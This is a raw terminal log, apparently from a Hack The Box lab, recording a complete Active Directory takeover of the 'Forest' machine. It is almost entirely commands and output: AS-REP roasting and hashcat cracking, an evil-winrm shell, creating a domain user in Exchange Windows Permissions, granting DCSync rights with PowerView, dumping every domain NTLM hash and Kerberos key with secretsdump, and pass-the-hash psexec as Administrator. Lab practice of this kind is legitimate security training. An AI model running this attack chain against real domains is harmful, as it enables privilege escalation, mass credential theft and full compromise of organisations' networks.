@@ -1,0 +1,401 @@
+┌──(kali㉿kali)-[~]
+└─$ echo -e "Administrator\nGuest\nkrbtgt\nDefaultAccount\n$331000-VK4ADACQNUCA\nSM_2c8eef0a09b545acb\nSM_ca8c2ed5bdab4dc9b\nSM_75a538d3025e4db9a\nSM_681f53d4942840e18\nSM_1b41c9286325456bb\nSM_9b69f1b9d2cc45549\nSM_7c96b981967141ebb\nSM_c75ee099d0a64c91b\nSM_1ffab36a2f5f479cb\nHealthMailboxc3d7722\nHealthMailboxfc9daad\nHealthMailboxc0a90c9\nHealthMailbox670628e\nHealthMailbox968e74d\nHealthMailbox6ded678\nHealthMailbox83d6781\nHealthMailboxfd87238\nHealthMailboxb01ac64\nHealthMailbox7108a4e\nHealthMailbox0659cc1\nsebastien\nlucinda\nsvc-alfresco\nandy\nmark\nsanti" > users.txt 
+                                                                                                                    
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:92e6942e67811a1e1f03b67e83f3f324$41b554ccd9c659f67bc37607379c7c53982fab034e02fcdb2438e003fe161cc396001ee8b4d60189f8fb835ddde2364bcc112a52d6f66ddbc6516d860e8658ed8de76c4ce8f568a7fdde6c5a13ab6ef2ee20467ffa0a0c75fa9cbd8db2bdfe3fb817058f0c2165da2523fc36f9c679f941e89def16457ec10a539932937bf2aa76111813c30b3a1e19a479c85c72fca5a7d77af9a4e213bd6d7d79a17f6d37165ab370b2a1d78ce371b0c3acfdeb5382cec85c4a0a48ccfffda2207093aaad7b80ada8ff828a0d771c2bca9f4bf1ce084cbc9118fdbdbcbaa0b1e87d1cdae9868caed1499654
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:92e6942e67811a1e1f03b67e83f3f324$41b554ccd9c659f67bc37607379c7c53982fab034e02fcdb2438e003fe161cc396001ee8b4d60189f8fb835ddde2364bcc112a52d6f66ddbc6516d860e8658ed8de76c4ce8f568a7fdde6c5a13ab6ef2ee20467ffa0a0c75fa9cbd8db2bdfe3fb817058f0c2165da2523fc36f9c679f941e89def16457ec10a539932937bf2aa76111813c30b3a1e19a479c85c72fca5a7d77af9a4e213bd6d7d79a17f6d37165ab370b2a1d78ce371b0c3acfdeb5382cec85c4a0a48ccfffda2207093aaad7b80ada8ff828a0d771c2bca9f4bf1ce084cbc9118fdbdbcbaa0b1e87d1cdae9868caed1499654:
+s3rvice
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls
+
+
+    Directory: C:\Users\svc-alfresco\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         8/8/2025  11:45 PM             34 user.txt
+
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user john abc123! /add /domain
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" john /add
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net localgroup "Remote Management Users" john /add
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dsacls "CN=Domain,DC=htb,DC=local" /G "htb\john:CA;Replicating Directory Changes"
+ 
+
+
+ Specified operation failed with ldap error:
+
+         0000208D: NameErr: DSID-03100241, problem 2001 (NO_OBJECT), data 0, best match of:
+        'DC=htb,DC=local'
+
+
+        No Such Object
+
+.
+The system cannot find the file specified.
+
+
+The command failed to complete successfully.
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Get-ADDomain
+
+
+AllowedDNSSuffixes                 : {}
+ChildDomains                       : {}
+ComputersContainer                 : CN=Computers,DC=htb,DC=local
+DeletedObjectsContainer            : CN=Deleted Objects,DC=htb,DC=local
+DistinguishedName                  : DC=htb,DC=local
+DNSRoot                            : htb.local
+DomainControllersContainer         : OU=Domain Controllers,DC=htb,DC=local
+DomainMode                         : Windows2016Domain
+DomainSID                          : S-1-5-21-3072663084-364016917-1341370565
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=htb,DC=local
+Forest                             : htb.local
+InfrastructureMaster               : FOREST.htb.local
+LastLogonReplicationInterval       :
+LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=htb,DC=local}
+LostAndFoundContainer              : CN=LostAndFound,DC=htb,DC=local
+ManagedBy                          :
+Name                               : htb
+NetBIOSName                        : HTB
+ObjectClass                        : domainDNS
+ObjectGUID                         : dff0c71a-a949-4b26-8c7b-52e3e2cb6eab
+ParentDomain                       :
+PDCEmulator                        : FOREST.htb.local
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=htb,DC=local
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {FOREST.htb.local}
+RIDMaster                          : FOREST.htb.local
+SubordinateReferences              : {DC=ForestDnsZones,DC=htb,DC=local, DC=DomainDnsZones,DC=htb,DC=local, CN=Configuration,DC=htb,DC=local}
+SystemsContainer                   : CN=System,DC=htb,DC=local
+UsersContainer                     : CN=Users,DC=htb,DC=local
+
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dsacls "DC=htb,DC=local" /G "htb\john:CA;Replicating Directory Changes"
+ 
+
+
+ Specified operation failed with ldap error:
+
+         00000005: SecErr: DSID-03152870, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+
+
+        Insufficient Rights
+
+.
+Access is denied.
+
+
+The command failed to complete successfully.
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload PowerView.ps1
+                                        
+Info: Uploading /home/kali/PowerView.ps1 to C:\Users\svc-alfresco\Desktop\PowerView.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> file:///home/kali/Downloads/Forest.pdf
+
+                                        
+Warning: Press "y" to exit, press any other key to continue
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> file:///home/kali/Downloads/Forest.pdfasdasd
+
+                                        
+Warning: Press "y" to exit, press any other key to continue
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> file:///home/kali/Downloads/Forest.pdf
+
+                                        
+Warning: Press "y" to exit, press any other key to continue
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-ObjectAcl -TargetDistinguishedName "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
+A parameter cannot be found that matches parameter name 'TargetDistinguishedName'.
+At line:1 char:15
++ Add-ObjectAcl -TargetDistinguishedName "DC=htb,DC=local" -PrincipalId ...
++               ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Add-DomainObjectAcl], ParameterBindingException
+    + FullyQualifiedErrorId : NamedParameterNotFound,Add-DomainObjectAcl
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass = convertto-securestring
+'abc123!' -asplain -force
+At line:2 char:11
++ 'abc123!' -asplain -force
++           ~~~~~~~~
+Unexpected token '-asplain' in expression or statement.
+
+At line:2 char:20
++ 'abc123!' -asplain -force
++                    ~~~~~~
+Unexpected token '-force' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : UnexpectedToken,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass = convertto-securestring
+'abc123!' -asplain
+At line:2 char:11
++ 'abc123!' -asplain
++           ~~~~~~~~
+Unexpected token '-asplain' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : UnexpectedToken,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-ObjectAcl -TargetDistinguishedName "DC=htb,DC=local" -PrincipalIdentity john -Credential $cred -Rights DCSync
+A parameter cannot be found that matches parameter name 'TargetDistinguishedName'.
+At line:1 char:15
++ Add-ObjectAcl -TargetDistinguishedName "DC=htb,DC=local" -PrincipalId ...
++               ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Add-DomainObjectAcl], ParameterBindingException
+    + FullyQualifiedErrorId : NamedParameterNotFound,Add-DomainObjectAcl
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-ObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions"
+Group name     Exchange Windows Permissions
+Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+Members
+
+-------------------------------------------------------------------------------
+john
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-ObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
+
+not working??
+used the Add-ObjectACL function from PowerView with the -Credential parameter, which runs the ACL modification as the john user (using his credentials), not as svc-alfresco.
+
+Here’s why the previous attempts failed:
+
+All earlier commands tried to modify the domain ACLs as svc-alfresco, who does not have permission to grant DCSync rights.
+The Add-ObjectACL command with -Credential actually impersonates john, who (as a member of "Exchange Windows Permissions") has the necessary rights to modify ACLs on the domain object.
+Key point:
+
+You must use the account that has the required permissions to make the change. By providing john’s credentials, you leveraged his group membership and privileges.
+This is a common technique in AD privilege escalation: create a user, add to a privileged group, and then use that user’s credentials to perform sensitive actions.
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> # Create secure credentials for john
+$pass = convertto-securestring 'abc123!' -asplain -force
+$cred = new-object system.management.automation.pscredential('htb\john', $pass)
+ 
+# Use Add-ObjectACL with the correct syntax and credentials
+Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
+
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ impacket-secretsdump htb/john@10.10.10.161
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+john:9601:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:802ebee4472d69b2ddad960ba9a4f317:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Kerberos keys grabbed
+htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
+htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
+htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
+htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
+htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
+htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
+htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local\santi:aes256-cts-
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file JZNwHGQZ.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service VMMv on 10.10.10.161.....
+[*] Starting service VMMv.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> cd ..
+ 
+C:\Windows> cd ..
+ 
+C:\> type C:\Users\Administrator\Desktop\root.txt
+...
+
+
+C:\> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 61F2-A88F
+
+ Directory of C:\
+
+09/20/2019  01:18 PM    <DIR>          PerfLogs
+09/22/2019  04:56 PM    <DIR>          Program Files
+11/20/2016  07:36 PM    <DIR>          Program Files (x86)
+09/22/2019  04:02 PM    <DIR>          Users
+08/09/2025  04:04 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  10,409,607,168 bytes free
+
+C:\> cd Users
+ 
+C:\Users> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 61F2-A88F
+
+ Directory of C:\Users
+
+09/22/2019  04:02 PM    <DIR>          .
+09/22/2019  04:02 PM    <DIR>          ..
+09/18/2019  10:09 AM    <DIR>          Administrator
+11/20/2016  07:39 PM    <DIR>          Public
+09/22/2019  03:29 PM    <DIR>          sebastien
+09/22/2019  04:02 PM    <DIR>          svc-alfresco
+               0 File(s)              0 bytes
+               6 Dir(s)  10,409,607,168 bytes free
+
+C:\Users> 
